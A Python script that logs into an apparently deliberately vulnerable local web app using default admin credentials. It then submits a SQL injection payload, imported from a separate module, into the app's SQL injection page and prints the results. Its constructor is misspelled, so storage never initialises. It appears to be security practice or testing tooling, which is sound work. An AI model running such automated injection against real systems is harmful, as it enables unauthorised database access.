import gevent
import gevent.monkey

gevent.monkey.patch_all()

import mechanicalsoup
import logging
import injections
import datetime

from storage.Storage import Storage
from exception import AuthException


class Crawler:
    login_data = {
        'username': 'admin',
        'password': 'password',
        'user_token': None
    }

    auth_url = 'http://localhost:11985/login.php'

    scrape_urls = [
        'http://localhost:11985/vulnerabilities/sqli/'
    ]

    browser = None
    authenticated = False

    def __init(self):
        storage = Storage()
        self.storage = storage.storage

    def run(self):
        self.authenticate()

        logging.basicConfig(
            filename='%s.log' % (datetime.datetime.now().strftime("%Y-%m-%d")),
            level=logging.DEBUG
        )
        jobs = [gevent.spawn(self.spawn, url) for url in self.scrape_urls]
        gevent.wait(jobs)

    def spawn(self, url):
        self.inject(url)

    def inject(self, url):
        self.browser.open(url)
        form = self.browser.select_form('form')
        form['id'] = injections.DATABASE_USERNAME

        self.browser.submit_selected()
        # we assume that the presence of `pre` tag means we got some results
        results = self.browser.get_current_page().select('pre')
        print(len(results))

        for result in results:
            print(result)

    def authenticate(self):
        """
        Authenticate based on known credentials using the form
        from the login page
        :return:
        """
        browser = mechanicalsoup.StatefulBrowser(raise_on_404=True)
        browser.open(self.auth_url)

        form = browser.select_form('form')
        form['username'] = self.login_data['username']
        form['password'] = self.login_data['password']

        response = browser.submit_selected()

        if 'Logout' in response.text:
            self.browser = browser
        else:
            raise AuthException
